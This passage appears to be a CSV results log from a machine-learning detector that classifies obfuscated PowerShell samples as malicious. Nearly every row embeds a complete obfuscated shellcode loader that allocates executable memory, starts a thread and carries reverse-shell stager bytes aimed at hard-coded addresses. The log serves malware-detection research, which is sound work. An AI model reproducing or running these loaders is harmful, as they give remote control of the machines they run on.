u','x09,0x',',0x2e,0xf7,0xcd,0x0c,0xf8,0x08,0xf8,0x3b,0x04,0x9d,0x07,0xea,0x53,0x09,0x0a,0xcb,0x93,0x96,0xf5,0x3e,0xa8,0x1f,0x60,0x81,0xc6,0x5f,0x64,0x01,0x16,0x','n IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAl','0xc2,0x04,0x03,0x72,','0xed,0x47,0x5d,0',',0x73,0x0d,0xa6,0xad,0x95,0x7d,0x06,0','OlqfhA = VFG[DllImport(H','0,0x78,0x94,0xb2,0x72,0x41,0x57,0xc7,0x73,0x86,0x8a,0x2a,0x21','5,0x25,0x4b,0xb9,0x35,0xae,0x55,0x3e,0x3a,0x85,','27,0x5d,0x08,0x87,0x23,0x39,0x0c,0x','0x20','36,0xee,0x01,0x7e,0xee,0x4a,0x52,0x9b,0xf1,0x4','locationType, uint flProtect);[DllImport(Hc9k','nt);VFG;Olqw = Add-Type -memberDefinition OlqfhA -Name Hc9Win32Hc9 -namespace Win32Functions -passthru;[Byt','x','dc,0xda,0xc5,0xd9,0x74,0x24,0xf4,0x5a,','00){Olqg = Olq','x14,0xf5,0x6a,0x83,0x96,0xda,0x06,0x8a','z.Length};OlqPjM=Ol','est, uint src, uint cou','c9kernel32.dllHc','6,0xc6,0x30,0x64,0x69,0xbf,0xe5,0','ateThread(0,0,OlqPjM,0,0,0);for (;;)','qw::VirtualAlloc(0,0x1000,Olqg,0x40);for (Olqi=0;Olqi -le (Olq','16,0xe7,0x31,0x28',' =','xfe,0x09,0x3d,0xf6,0xbe,0xf9,0xd5,0x1c,0x31,0x25,0xc5,0x1e,0x9b,0x4e,0x6f,0xf1,0x72,0x26,0x07,0x68,0xdf,0xbc,0xb6,0x',',0x47,0x31,0x72,0x13,0x83,','int dwStackSize, IntPt','0x7','x70,0xb4,0x35,0x37,0x40,0x','et(IntPtr d',',0x03,0','be,0x18,0xbb,0x2b,0x92,0x8','x47,0x7a,0xdf,0x2e,','0x11,0',',0x5f,0xc0,0x99,0xd6,0xd4,0x9c,0x21,0x5c,0xa6,0x31,0x22,0x81,0x7e,0x3','x',',0xef,0x1a,0xa9;Olqg = 0x1000;if (Olqz.Length -gt 0x10',',','3',',0x93,0x06,0x96,0xb9,0xe7,0x2c,0x32,0xe2,0xbc,0x4d,0x63,0x4e,0x12,0x71,0x73,0',' 0xbe,0x','ublic static extern IntPtr CreateThread','e[]];[Byte[]]Olqz','0x30,0')).REplaCe(([char]72+[char]99+[char]57),[sTrING][char]34).REplaCe('Olq','$').REplaCe(([char]86+[char]70+[char]71),[sTrING][char]39))",malicious,TP
2026-07-13 16:51:41,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1827.ps1,custom-ps-ml,UNKNOWN,938d5d02-29b7-462e-a89d-0fc0f34ad378,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2928,1727.51," ((\""{25}{2}{9}{31}{44}{30}{6}{0}{50}{55}{40}{21}{14}{41}{68}{22}{24}{37}{34}{49}{48}{28}{54}{66}{4}{42}{39}{38}{51}{61}{47}{59}{16}{35}{56}{17}{10}{15}{43}{29}{5}{18}{63}{32}{23}{8}{19}{64}{3}{36}{65}{53}{67}{52}{11}{7}{57}{26}{45}{46}{33}{27}{58}{20}{1}{62}{12}{13}{69}{60}\"" -f ' uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(yZdmsvcrt.dllyZd)]public static extern IntPtr ','0);f','static extern I','a,0x05,0x68,0',',0x10,0x8b,0x42,0x3c,0x01,0x','x5f,0x54,0x68,0x','port(yZdkernel32.dllyZd)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,',',0x04,0x56,0x57,0x68,0x02','x50,0x50,0x50,0x40','ntPtr VirtualAlloc(Int','24,0x01,0xd3,0x66,0x8b',',0x6a,0x00,0x6a','pyi=0;Spyi -le (Spyz.Length-1);Spyi++) {Spyw::memset([IntPtr](Spyx.ToInt32()+Spy','i), Sp',' yZdWin3',',0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,','x75,0xf4,0x03,0x7d,0xf','8,0x8b,0x58,0x','4c,0x77,0x26,0x07,0xff,0xd5',',','alAlloc(0,0x1000,Spyg,0x4',' = Add-Type -memberDefinition Spyc -Name',']];[Byte[]]Spyz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0',',0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0','x8b,0x52,0x14,0x8b,0x72','Spyc = pg5[DllImport(yZdkernel32.dllyZd)]public ','f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93','01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;Spyg = 0x1000;if (Spyz.Length -gt 0x1000){S',',0x20,0xc','77,0x73,0x32,0',';[DllIm','Ptr lpAddress, uint dwSize, uint flAllocationType, uint flProte','01,0x00,0x00,0x29,0xc4','x','x28,0x0f,0xb7,0x4a,0x26,','8,0x3b,0x7d','xc0',',0','74,0x4a,0x01,0xd0,0x50,0x8b,0x48,','x85,0xc0,0x','tPtr dest, uint src, uint count);pg5;Spyw','2yZd -namesp','d0,0x8b,0x40,0x78,0','0x00,0x68,0x','ct)',',0x53',',0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0','0x3c,','0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c','0x31,0xff,','memset(','0x18,0x8b,0x58,0x2','0xd5','x4e,0x08,0x75,0x','1,0xcf,0x0d,0x01,0xc7,0xe2,','In',',0x24,0x75,0xe2,0x5',',0xd9,0xc8,0x5','pyg = Spyz.Length};Spyx=Spyw::Virtu','0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0','};Spyw::CreateThread(0,0,Spyx,0,0,0);for (;;){Start-sleep 60};','0,0x01,0xd3,0xe3,','or (S',',0xb8,0x90,0x','0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6',',0xa8,0xcb,0x81,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0','0xf0,0x52,0x57,0x8b,0x52','ec,0x68,0xf0,0xb5,0xa2,0x56,0xff,','ace Win32Functions -passthru;[Byte[','yz[Spyi], 1)')).rEPLACe('pg5',[STRIng][chAR]39).rEPLACe('yZd',[STRIng][chAR]34).rEPLACe(([chAR]83+[chAR]112+[chAR]121),[STRIng][chAR]36) | iNVoKE-eXPRession",malicious,TP
2026-07-13 16:51:46,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\183.ps1,custom-ps-ml,UNKNOWN,3d60e94e-2f88-4f27-9b25-b96e91c38571,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2757,1787.3,"&amp;( $PShoMe[21]+$PsHomE[30]+'X')( ((\""{5}{39}{1}{29}{40}{27}{13}{14}{45}{7}{37}{32}{41}{15}{12}{38}{2}{24}{30}{22}{16}{33}{10}{36}{23}{20}{44}{43}{17}{28}{34}{9}{8}{4}{6}{35}{25}{3}{42}{11}{26}{18}{19}{21}{31}{46}{0}\""-f',0,Bm6x,0,0,0);for (;;){Start-sleep 60};','Import(suwkerne','89,0x00','68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0','6a,0x10,0x5','Bm6','6,0x57,0x68,0x99,0xa5,0x','set(IntPtr dest, uint sr','xff,0xd5,0x97,0x6a,0x05,0x68,0xbe,0xeb,0x23,0xdc,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x',',0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0','x42,0x3c,','x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,','ctions -passth','ad(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntP','tr lpThreadId);[DllImport(suwmsvcr','n32Fun',',0x','5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0','6','i=0;Bm6i -le (Bm6z.Length-1);Bm6i++) {','f4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x','Bm6w::memset([IntPtr](Bm6x.ToIn','0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28','0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0x',',0x00,0x00,0x60,0x8',',0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x','0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;Bm6g = 0x1000;if (Bm6z.Length -gt 0x1000){Bm6g = Bm6z.Length};Bm6x=Bm6w::VirtualAlloc(0,0x1000,Bm6g,0x40);for (Bm','Protect);[DllImport(suwkernel32.dllsuw)]public static extern IntPtr CreateThre','x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54','l32.dllsuw)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uin','9,0xe5,0x31,0xd2,','t32()+Bm6i), Bm6z[','on Bm6c -Name suwWin32suw -namespace','0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0',',0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40','74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c','0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,','c, uint count);hlg;Bm6w = Add-Type -memberDefiniti','ru;[Byte[]];[Byte[]]Bm6z = 0xfc,0xe8,0x','c = hlg[Dll','t dwSize, uint flAllocationType, uint fl',' Wi','x8b,0x36,0x6a,0x40,0x68,0','58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x','75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x','t.dllsuw)]public static extern IntPtr mem','Bm6i], 1)};Bm6w::CreateThread(0')).REpLacE('hlg',[STRIng][CHar]39).REpLacE('Bm6',[STRIng][CHar]36).REpLacE('suw',[STRIng][CHar]34))",malicious,TP
2026-07-13 16:51:51,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1834.ps1,custom-ps-ml,UNKNOWN,175b8d43-02b9-4ae7-be26-bba79fabf25e,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,3064,1608.5," . ((gv '*mdR*').Name[3,11,2]-JoiN'') ((((\""{46}{26}{8}{36}{22}{29}{11}{3}{35}{19}{39}{2}{38}{62}{57}{41}{33}{7}{30}{71}{34}{48}{23}{20}{53}{51}{69}{0}{28}{55}{44}{60}{13}{49}{47}{54}{21}{43}{15}{64}{68}{18}{56}{31}{42}{63}{67}{37}{50}{32}{45}{58}{17}{14}{9}{25}{70}{24}{65}{1}{66}{27}{59}{40}{16}{61}{72}{10}{52}{12}{4}{6}{5}\""-f 'x4e,0x17,0x6e,0x77,0x7b,0xac,0x02,0x50,0x8c,0x05,0','x7c,0x05,0xb8,0x66,0x83,0x90,0xac,0x3b,0x16,','(IntPt','lpParameter, uint dwCreationFlags,','w::CreateThr','-sleep 60};','ead(0,0,JuEx,0,0,0);for (;;){Start','xd9,0x74,','Address, uint dwSize, uint flAllocat',',0x09,','JuEw::VirtualAlloc(0,0x1000',' ','(JuEi=0;JuEi -le (JuEz.Length-1);JuEi++) {JuEw::memset([IntPtr](JuEx.ToInt32()+JuEi), JuEz[JuEi], 1)};JuE','2,0x77','c0,0x47,0x23,0x85,0x9f,0x3a,0xe5,0x9a,0x35,0x50','xe','49,0x97;JuEg = 0x1000;if (JuEz.Length -gt 0x',',0xca,0xb0,0xd4,0x54,0x60,0x5f,0x81,0x0d,0x1c,0xc6,0x88,0xc6,0xbd,0x07,0x07,0xa3,0xfd,0x8c,0xa4,0x53,0xb3,0x64,0x',',0x22,0xd6,0x0c,0','ThreadId);[','0x52,0x5a,0x93,0xac,0xa','0xba,0xd8,','Protect);[DllImport(Le2kernel32.dllLe2)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,','3,0x83,0xc7,0xaa,0xcd,0x43,','0xa1,0xd6,0xea,0xdb,0xcd,','0x0f,0xb2,0xf3,0x5e,0xa7,0xb8,0x22,0xa8,0','VirtualAlloc(IntPtr lp','d4,0x32,0x07,0x27,0x03,','xa8,0x86,0xa3,0x96,0x81,0xfb,0xa2,0x14,0xd8,0x2f,0x05,0x25,0x13,0x22,0x44,0x62,0x4e,0',' IntPtr lpStartAddress, IntPtr','0x24,','a8,0xcd,0x23,0xd3,0xc0,0x8f,0x2b,0x',',0x5f,0xba,0x62,0x94,0x30','9,0xc5,0',',0x5f,0x13,0x03,0x5',' IntPtr lp','ionType, uint fl','a,0x1b,0xd1,0x1','r dest, ui','DllImport(Le2msvcrt.dllLe2)]public static extern IntPtr memset','x7d,0x','e[]];[Byte[]]JuEz = 0xbb,0xae,0x2f,0xb6,0xae,0xd','10,0x','0x66,0xdc,0x11,0x25,0x47,0x2f,0x6b,0x61,0x6f,0xd0,0x1e,0x9b,0x8c,0x6d,0x19,0x58,0','4,0x62,0x89',',0','JuEc = 0mt[DllImport(Le2kernel32.dllLe2)]public static extern IntPtr ','x49,0x69,0x2e,0x28,0x6b,0xbe,0x5a,0x61,0x73,0xa3,0x67,0','f,0x1',',0xe6,0','6,0xd6,0x5c,0x20,0x3a','4e,0xab,0x34,0x51,0x1a,0x9b,0x8',',JuEg,0x40);for ','b,0x9a,0xf4,0x25,0x','x3b,0x08,0x17,0x13,','xcf,0x14,0x3b,0x0','x85,0x8d,0x87,0x','yt','x13,0xc2,0x44,0xf1,0xc3,0xaa,0x8e,0xfe,0x3c','0x7a,0',',0x48,0x50,0xbf,0x22,0x02,0x74,0xc7,0xd7,0xd','1000){JuEg = J','nt src, uint count);0mt;JuEw = Add-Type -memberDefinition JuEc -Name Le2Win32Le2 -namespace Win32Functions -passthru;[B','e9,0x2f,0xab,0x3e,0x','f,0xa9,0xac,0x7b,0x57,0x39,0x16,0xa0,0x66,0xee,0xc1,0x23,0x64','0x36,0xeb,0x1b,0x98,0x5c,0xeb,0x73,0','0x1b,0x85,0xe8,0xb1,0x73,0x2b,0xd7,0xf6,0xdb,0x','7a,0x43,0x99,0xe1,0xd0,0xcb,0x91,0x6a,0xff,0x0c,0xd6,0x40,0x47,0x82,0x29,0x6b,0xb8,0x8a,0xed,0x3f,0xe8,0xa4,0xc4,0x3f,0x63,0x35,0xe9,0x95,0x1e,0x30,0x7d,0x7e,0x2',',0x5b,0x85,0x6c,0x68,0x5a,0x4a,0x07,0x94,0xd7,0x6d,0xc8,0x1d,0xa3,0x49,0xcc,0x46,0x77,0xf3,0x55','4,0x11,0','x68,0x42,0x01,0xa3,','0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x31','uEz.Length};JuEx=')) -cReplaCe  ([cHAR]74+[cHAR]117+[cHAR]69),[cHAR]36 -RePlACE ([cHAR]76+[cHAR]101+[cHAR]50),[cHAR]34  -cReplaCe  '0mt',[cHAR]39) )",malicious,TP
2026-07-13 16:51:57,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1836.ps1,custom-ps-ml,UNKNOWN,2745a8a2-754d-47c6-8f35-85ec2b335c45,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2773,1959.27,"&amp;( $Shellid[1]+$shelLiD[13]+'X')( ((\""{12}{10}{26}{24}{21}{42}{27}{23}{3}{30}{39}{2}{22}{19}{36}{16}{15}{25}{37}{1}{32}{9}{28}{0}{7}{44}{41}{20}{40}{18}{29}{8}{46}{13}{45}{14}{5}{17}{38}{33}{35}{6}{4}{43}{34}{31}{11}\"" -f ',0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,',',0xff,0x31,0xc0,0xac,0x','x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x5','8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a','+','x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x','z.Length-1);4Eii','0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x8',',0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xf','0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,','Ptr',':CreateThread(0,0,4Eix,0,0,0);for (;;){Start-sleep 60};','4Eic = ydK[DllImport(8wnkernel32.dll8wn)]public static extern Int','xd5,0x8b,0x','0x6a,0x40,0x68,0x00,0x10,0x00,0','01,0xd3,0xe3,0x3c,0x49,0','x58,0x20,0x','00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc','0x85,0xc0,','0x8b,0x40,0x78,0x85,','x6a,0x10,0x56,0x57,0x68,0x99,0xa','2.dll8wn)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,','2,0x10,0x8b,0x42,0x3c,0x01,0xd0,','w = Add-Type -memberDefinition 4Eic -Name 8wnWin328wn -namespace Win32Functions -passthru;[Byte[]];[Byte[]]4Eiz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x','tr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(8wnkernel3','x8b,0x34,0x8b',' VirtualAlloc(IntP',' extern IntPtr memset(IntPtr dest, uint src, uint count);ydK;4Ei','0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12','0x74,0x0c,0xff,0x4e',',0x26,0x31,0xff,0x31,','i], 1)};4Eiw:','c1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,','if (4Eiz.Length -gt 0x1000){4E','ii), 4Eiz[4Ei','ig = 4Eiz.Length};4Eix=4Eiw::VirtualAlloc(0,0x1000,4Eig,0x40);for (4Eii=0;4Eii -le (4Ei','0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0',',0x01,0xd6,0x31','3;4Eig = 0x1000;','0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0','5,0x74,0x61,0xff,0xd5,','0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0c,0x68,0x02,0x00,0x01,0xbc,0x89,0xe6,0',' IntPtr lpThreadId);[DllImport(8wnmsvcrt.dll8wn)]public static','+) {4Eiw::memset([IntPtr](4Eix.ToInt32()+4E','0,','36,','f,0')).repLace('ydK',[STRINg][Char]39).repLace(([Char]56+[Char]119+[Char]110),[STRINg][Char]34).repLace('4Ei','$') )",malicious,TP
2026-07-13 16:52:04,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\184.ps1,custom-ps-ml,UNKNOWN,f845c9a1-eb83-447e-beb9-bdee9ada10c6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2800,1936.69,"(((\""{23}{41}{27}{39}{15}{0}{29}{18}{24}{5}{14}{8}{35}{17}{11}{37}{3}{10}{38}{34}{30}{19}{33}{13}{4}{36}{44}{28}{25}{26}{9}{40}{43}{16}{2}{6}{22}{45}{21}{1}{7}{20}{12}{46}{31}{42}{32}\""-f 'eThread(IntPtr lpThreadAttribu','x6a,0x04,0x56,0x57,0x68','x68,0x02,0x00,0x','xd2,0x64,0x8b,0x52','8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x','tr lpParameter, uint dwCreationFlags, IntPtr l','11,0x52,0x89,0x',',0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x0','st, uint src, uint count);iKI;mzRw = Add-Type -memberDefinition mzRc -Name pJeWin32pJe -namespace Win32Functions -passthru;[Byte[]];[Byte[','0x40,0',',0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,','x00,0x00,0','6,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd',',0x8b,0x34,0x','pThreadId);[DllImport(pJemsvcrt.dllpJe)]public static extern IntPtr memset(IntPtr de','reat','0xee,0x8c,0x95,0','0xe8,0x89,0x00,0','dwStackSize, IntPtr lpStartAddre','0,0x01,0xd3,0xe3,0x3c,0','0,0x5','xa2,0x56,0xff,0xd5,0x6a,0x00,0','e6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,','mzRc = iKI[DllIm','ss, IntP','5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x','00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,','static extern IntP','0,0x89,0x44,0x24,0x24,0x5b,0x','tes, uint ','7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x2','0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5','mzRi++) {mzRw::memset([IntPtr](mzRx.ToInt32()+mzRi), mzRsc[mzRi], 1)};mzRw::CreateThread(0,0,mzRx,0,0,0);for (;;){Start-sleep 60};','x49','xc0,0xac,0x3c,0x61,0x',']]mzRsc = 0xfc,','24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,','x60,0x89,0xe5,0x31,0','0xff,0x31,0','tr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(pJekernel32.dllpJe)]public static extern IntPtr C','x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0','port(pJekernel32.dllpJe)]public ',',0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;mzRsize = 0x1000;if (mzRsc.Length -gt 0x1000){mzRsize = mzRsc.Length};mzRx=mzRw::VirtualAlloc(0,0x1000,mzRsize,0x40);for (mzRi=0;mzRi -le (mzRsc.Length-1);','xd5,0x97,0x6a,0x05,0x68,0x25,','0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd','0x68,0xf0,0xb5,0','5,0x93,0x53,0x6a,0x00,0x56,0x53,')) -rEplAce  ([CHAr]105+[CHAr]75+[CHAr]73),[CHAr]39  -rEplAce ([CHAr]112+[CHAr]74+[CHAr]101),[CHAr]34-rEplAce'mzR',[CHAr]36)| &amp; ( $eNV:ComSpEC[4,26,25]-joiN'')",malicious,TP
2026-07-13 16:52:18,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1870.ps1,custom-ps-ml,UNKNOWN,6b0b8366-04c9-4e84-b00e-1b2cd110c69d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2970,1638.45,"((\""{70}{0}{56}{51}{57}{11}{45}{20}{6}{37}{54}{44}{10}{30}{48}{41}{66}{16}{18}{21}{23}{8}{17}{52}{35}{24}{50}{13}{63}{58}{15}{3}{27}{7}{33}{28}{19}{64}{39}{68}{5}{38}{4}{26}{40}{34}{12}{1}{62}{69}{49}{14}{32}{59}{25}{61}{29}{42}{47}{67}{65}{60}{53}{31}{36}{2}{43}{22}{55}{9}{46}\""-f'r lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[','0,0x68,0x29,0x80,0x6b,0x00,0xff,0x','0xa2,0x56,0x6a,0x00','18,0xe3,0x3a,0x49,','x33,0x32,0x00','0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xe','r lpParam','x8b,0x34,0x8b,0x01,0xd6,0x',',0x31,','(0,0x1000,Uz3g,0x40);for (Uz3i=0;Uz3i -le (Uz3z.Length-1);Uz3i++) {Uz3w::memset(','z3w = Add-Type -m','tPtr CreateThread(IntPtr lpThreadAttributes, u','0,0x29,0xc4,0x54,0x5','x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,','xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,',',0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x','u;[Byte[]];[Byte[]]Uz3z = 0xfc,0xe8','0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,',',0x82,0x00,0x00,0x','x1c,','tPt','00','z3z.Length};Uz3',',0x60,0x89,0xe5','0xb7,0x4a','0x00,',',0x00,0x68,0x77,0x73,0','0','xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0','x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x3','ember','0','0x00,0x00,0x','31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0','0',',0x0f,','xb5,','eter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(RCEmsvcrt.dllRCE)]public static extern IntPtr mems','b,0x8d,0x5d,0x68,0','1,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5','x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x','2RCE -namespace Wi','6,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0',',0x53,0xff,0xd5;Uz3g = 0x1000;if (Uz3z.Length -gt 0x1000){Uz3g = U',' uint src, uint count);Njq;U','int dwStackSize, IntPtr lpStartAddress, In','[IntPtr](Uz3x.ToInt32()+Uz3i), Uz3z[Uz3i], 1)};Uz3w::CreateThread(0,0,Uz3x,0,0,0);for (;;){Start-sleep 60};','x56,0x6a,0','Definition Uz3c -Name RCEWin3','0x10,0x56,0x57,0x68,0x99,0',',0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0','ern','0x28','0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,','et(IntPtr dest,','x=Uz3w::VirtualAlloc','DllImport(RCEkernel32.dllRCE)]public static ext',' 